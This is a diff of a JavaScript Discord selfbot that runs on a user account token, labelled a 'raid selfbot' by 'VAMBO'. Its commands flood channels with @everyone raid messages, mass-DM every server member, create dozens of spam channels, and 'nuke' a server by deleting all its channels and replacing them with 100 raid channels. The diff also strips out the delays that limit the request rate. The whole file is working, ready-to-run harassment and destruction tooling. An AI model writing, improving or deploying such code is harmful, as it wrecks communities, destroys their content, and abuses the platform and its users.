@@ -1,7 +1,6 @@
 const { Client } = require('discord.js-selfbot-v13');
 const client = new Client();
 
-// Use environment variable for security
 const TOKEN = process.env.DISCORD_TOKEN;
 const PREFIX = '!';
 
@@ -20,234 +19,100 @@ app.listen(PORT, () => {
 
 client.on('ready', () => {
     console.log(`✅ Logged in as ${client.user.tag}`);
-    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
-    console.log(`Type !spamall in any channel to flood all channels with 200 messages`);
-    console.log(`Type !nuke to delete all channels and create 100 raid channels`);
-    console.log(`Type !help for all commands`);
 });
 
+// Your exact raid message
+const raidMessage = `@everyone @here **RAIDED BY VAMBO**
+
+### NEVER SCAM AGAIN SON😂
+            😯KICK ROCKS😯
+https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;
+
 client.on('messageCreate', async (message) => {
-    // Only respond to your own messages
     if (message.author.id !== client.user.id) return;
     if (!message.content.startsWith(PREFIX)) return;
 
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // ===== HELP COMMAND =====
-    if (command === 'help') {
-        const helpMsg = `**🔞 RAID SELFBOT COMMANDS**
-
-**!spamall** - Send 200 messages to EVERY channel
-**!nuke** - Delete all channels, create 100 raid channels
-**!spamchannels [number]** - Create X channels with raid message
-**!massdm [message]** - DM all server members
-**!flood [count]** - Flood current channel with messages
-**!status** - Check bot stats and permissions
-**!help** - Show this menu
-
-💀 **RAIDED BY VAMBO**`;
-        await message.reply(helpMsg);
-    }
-
-    // ===== SPAM ALL EXISTING CHANNELS (200 MESSAGES EACH) =====
+    // ===== SPAM ALL CHANNELS (INSTANT) =====
     if (command === 'spamall') {
-        const guild = message.guild;
-        if (!guild) {
-            message.reply('This command only works in servers!');
-            return;
-        }
-
-        const messagesPerChannel = 200;
-
-        await message.reply(`🔥 **MEGA SPAM INITIATED**\nSending **200 messages** to EVERY channel in **${guild.name}**\nThis will take a while...`);
-
-        const raidMessage = `@everyone @here **RAIDED BY VAMBO**
-
-### NEVER SCAM AGAIN SON😂
-            😯KICK ROCKS😯
-https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;
-
-        const textChannels = guild.channels.cache.filter(c => 
-            (c.type === 'GUILD_TEXT' || c.type === 'GUILD_NEWS') && 
-            c.permissionsFor(guild.members.me).has('SendMessages')
-        );
-
-        console.log(`📊 Found ${textChannels.size} text channels to spam in ${guild.name}`);
-        
-        let totalSent = 0;
-        let totalFailed = 0;
-        let channelsCompleted = 0;
-        let startTime = Date.now();
-
-        for (const [channelId, channel] of textChannels) {
-            channelsCompleted++;
-            console.log(`\n📢 Channel ${channelsCompleted}/${textChannels.size}: #${channel.name}`);
-            
-            let channelSuccess = 0;
-
-            for (let i = 1; i <= messagesPerChannel; i++) {
-                try {
-                    await channel.send(raidMessage);
-                    channelSuccess++;
-                    totalSent++;
-                    
-                    if (i % 20 === 0) {
-                        console.log(`   Progress: ${i}/200 messages sent in #${channel.name}`);
-                    }
-                    
-                    await new Promise(resolve => setTimeout(resolve, 600));
-                    
-                } catch (error) {
-                    totalFailed++;
-                    console.log(`   ❌ Failed message ${i} in #${channel.name}: ${error.message}`);
-                    
-                    if (error.message.includes('rate')) {
-                        console.log('   ⏳ Rate limited, waiting 5 seconds...');
-                        await new Promise(resolve => setTimeout(resolve, 5000));
-                    } else {
-                        break;
-                    }
-                }
-            }
-
-            console.log(`   ✅ #${channel.name}: ${channelSuccess}/${messagesPerChannel} messages sent`);
-            await new Promise(resolve => setTimeout(resolve, 2000));
-        }
-
-        let endTime = Date.now();
-        let minutes = Math.floor((endTime - startTime) / 60000);
-        let seconds = Math.floor(((endTime - startTime) % 60000) / 1000);
-
-        const report = `**✅ MEGA SPAM COMPLETE!**
-
-📊 **RESULTS:**
-• Server: **${guild.name}**
-• Channels hit: **${textChannels.size}**
-• Messages per channel: **${messagesPerChannel}**
-• Total messages sent: **${totalSent}**
-• Failed messages: **${totalFailed}**
-• Time taken: **${minutes}m ${seconds}s**
-
-💀 **RAIDED BY VAMBO**`;
-
-        try {
-            await message.channel.send(report);
-        } catch (e) {
-            console.log('Could not send final report');
-        }
-
-        console.log('\n' + '='.repeat(50));
-        console.log('💀 **MEGA SPAM COMPLETE** 💀');
-        console.log(`Server: ${guild.name}`);
-        console.log(`Messages sent: ${totalSent}`);
-        console.log('='.repeat(50));
-    }
-
-    // ===== FULL NUKE COMMAND =====
-    if (command === 'nuke') {
         const guild = message.guild;
         if (!guild) return;
 
-        await message.reply('💣 **NUKE INITIATED** - Deleting ALL channels...');
-        console.log(`Starting nuke on ${guild.name}`);
-
-        // Delete all channels
-        let deletedCount = 0;
-        const channels = [...guild.channels.cache.values()];
+        // Send activation message
+        await message.channel.send('✅ VAMO ACTIVATED');
         
-        for (const channel of channels) {
+        // Get all text channels
+        const channels = guild.channels.cache.filter(c => 
+            c.type === 'GUILD_TEXT' && 
+            c.permissionsFor(guild.members.me).has('SendMessages')
+        );
+
+        console.log(`Spamming ${channels.size} channels...`);
+
+        // Send ONE message to each channel (instant)
+        for (const [id, channel] of channels) {
             try {
-                await channel.delete();
-                deletedCount++;
-                console.log(`✅ Deleted: ${channel.name}`);
-                await new Promise(resolve => setTimeout(resolve, 300));
+                await channel.send(raidMessage);
+                console.log(`✅ Sent to #${channel.name}`);
             } catch (error) {
-                console.log(`❌ Failed to delete ${channel.name}: ${error.message}`);
+                console.log(`❌ Failed #${channel.name}: ${error.message}`);
             }
         }
-        
-        console.log(`✅ Deleted ${deletedCount} channels`);
 
-        // Create 100 raid channels
-        console.log(`🔥 Creating 100 raid channels...`);
+        console.log('✅ Spamall complete');
+    }
+
+    // ===== FLOOD CURRENT CHANNEL =====
+    if (command === 'flood') {
+        // Send activation message
+        await message.channel.send('✅ VAMO ACTIVATED');
         
+        const count = parseInt(args[0]) || 50;
+        const channel = message.channel;
+
+        // Send messages instantly (no delay)
+        for (let i = 0; i < count; i++) {
+            try {
+                await channel.send(raidMessage);
+                console.log(`✅ Flood message ${i+1}/${count}`);
+            } catch (error) {
+                console.log(`❌ Flood stopped: ${error.message}`);
+                break;
+            }
+        }
+    }
+
+    // ===== SPAM CHANNELS COMMAND =====
+    if (command === 'spamchannels') {
+        const guild = message.guild;
+        if (!guild) return;
+
+        await message.channel.send('✅ VAMO ACTIVATED');
+
+        let channelCount = parseInt(args[0]) || 10;
+        if (channelCount > 50) channelCount = 50;
+
         const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
-        const raidMessage = `@everyone @here **RAIDED BY VAMBO**
 
-### NEVER SCAM AGAIN SON😂
-            😯KICK ROCKS😯
-https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;
-
-        let createdCount = 0;
-
-        for (let i = 1; i <= 100; i++) {
+        for (let i = 1; i <= channelCount; i++) {
             try {
                 const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                     type: 'text'
                 });
                 await newChannel.send(raidMessage);
-                createdCount++;
-                console.log(`✅ Created channel ${i}/100`);
-                await new Promise(resolve => setTimeout(resolve, 500));
-            } catch (error) {
-                console.log(`❌ Failed to create channel ${i}: ${error.message}`);
-                if (error.message.includes('rate')) {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                }
-            }
-        }
-
-        console.log('='.repeat(50));
-        console.log('💀 **NUKE COMPLETE** 💀');
-        console.log(`✅ Deleted: ${deletedCount} channels`);
-        console.log(`✅ Created: ${createdCount} raid channels`);
-        console.log('='.repeat(50));
-    }
-
-    // ===== CREATE SPAM CHANNELS =====
-    if (command === 'spamchannels') {
-        const guild = message.guild;
-        if (!guild) return;
-
-        let channelCount = parseInt(args[0]) || 10;
-        if (channelCount > 50) channelCount = 50;
-
-        await message.reply(`🔥 Creating **${channelCount}** channels...`);
-
-        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
-        const raidMessage = `@everyone @here **RAIDED BY VAMBO**
-
-### NEVER SCAM AGAIN SON😂
-            😯KICK ROCKS😯
-https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;
-
-        let created = 0;
-
-        for (let i = 0; i < channelCount; i++) {
-            try {
-                const suffix = i > 0 ? `-${i}` : '';
-                const newChannel = await guild.channels.create(channelName + suffix, {
-                    type: 'text'
-                });
-                await newChannel.send(raidMessage);
-                created++;
-                console.log(`✅ Created channel #${i+1}`);
-                await new Promise(resolve => setTimeout(resolve, 800));
+                console.log(`✅ Created channel ${i}/${channelCount}`);
             } catch (error) {
                 console.log(`❌ Failed: ${error.message}`);
             }
         }
-
-        await message.reply(`✅ Created ${created} channels!`);
     }
 
-    // ===== MASS DM =====
+    // ===== MASS DM COMMAND =====
     if (command === 'massdm') {
         const guild = message.guild;
-        const dmMessage = args.join(' ') || `@everyone RAIDED BY VAMBO`;
-
-        await message.reply(`📨 Sending DMs to ${guild.memberCount} members...`);
+        await message.channel.send('✅ VAMO ACTIVATED');
 
         let sent = 0;
         let failed = 0;
@@ -256,57 +121,66 @@ https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;
             if (member.user.bot || member.id === client.user.id) continue;
 
             try {
-                await member.send(dmMessage);
+                await member.send(raidMessage);
                 sent++;
                 console.log(`✅ DM sent to ${member.user.tag}`);
-                await new Promise(resolve => setTimeout(resolve, 1500));
             } catch (e) {
                 failed++;
-                console.log(`❌ Failed to DM ${member.user.tag}`);
             }
         }
 
-        await message.reply(`✅ DMs sent: ${sent}, Failed: ${failed}`);
+        console.log(`✅ MassDM complete: ${sent} sent, ${failed} failed`);
     }
 
-    // ===== FLOOD CURRENT CHANNEL =====
-    if (command === 'flood') {
-        const count = parseInt(args[0]) || 50;
-        const channel = message.channel;
-
-        await message.reply(`🌊 Flooding with ${count} messages...`);
-
-        for (let i = 0; i < count; i++) {
-            try {
-                await channel.send(`@everyone **RAIDED BY VAMBO** - Wave ${i+1}/${count}`);
-                await new Promise(resolve => setTimeout(resolve, 300));
-            } catch (e) {
-                console.log(`Rate limited, waiting...`);
-                await new Promise(resolve => setTimeout(resolve, 5000));
-            }
-        }
-    }
-
-    // ===== STATUS COMMAND =====
-    if (command === 'status') {
+    // ===== NUKE COMMAND =====
+    if (command === 'nuke') {
         const guild = message.guild;
-        const member = guild.members.cache.get(client.user.id);
+        if (!guild) return;
 
-        const statusMsg = `**📊 SELFBOT STATUS**
+        await message.channel.send('✅ VAMO ACTIVATED');
 
-**Account:** ${client.user.tag}
-**Servers:** ${client.guilds.cache.size}
-**Current Server:** ${guild.name}
+        // Delete all channels (fast)
+        console.log('Deleting all channels...');
+        for (const channel of guild.channels.cache.values()) {
+            try {
+                await channel.delete();
+                console.log(`✅ Deleted ${channel.name}`);
+            } catch (error) {
+                console.log(`❌ Failed to delete: ${error.message}`);
+            }
+        }
 
-**Your Permissions:**
-• Manage Channels: ${member.permissions.has('ManageChannels') ? '✅' : '❌'}
-• Send Messages: ${member.permissions.has('SendMessages') ? '✅' : '❌'}
-• Administrator: ${member.permissions.has('Administrator') ? '✅' : '❌'}
+        // Create 100 channels (fast)
+        console.log('Creating 100 channels...');
+        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
 
-**Uptime:** Running 24/7 on Railway
-**Prefix:** !`;
+        for (let i = 1; i <= 100; i++) {
+            try {
+                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
+                    type: 'text'
+                });
+                await newChannel.send(raidMessage);
+                console.log(`✅ Created channel ${i}/100`);
+            } catch (error) {
+                console.log(`❌ Failed: ${error.message}`);
+            }
+        }
 
-        await message.reply(statusMsg);
+        console.log('✅ Nuke complete');
+    }
+
+    // ===== HELP COMMAND =====
+    if (command === 'help') {
+        await message.channel.send(`**🔥 VAMO RAID SELFBOT**
+
+!spamall - Spam all channels once
+!flood [count] - Flood current channel
+!spamchannels [num] - Create raid channels
+!massdm - DM all members
+!nuke - Delete all + create 100 channels
+!help - Show this menu
+
+✅ VAMO ACTIVATED`);
     }
 });
 
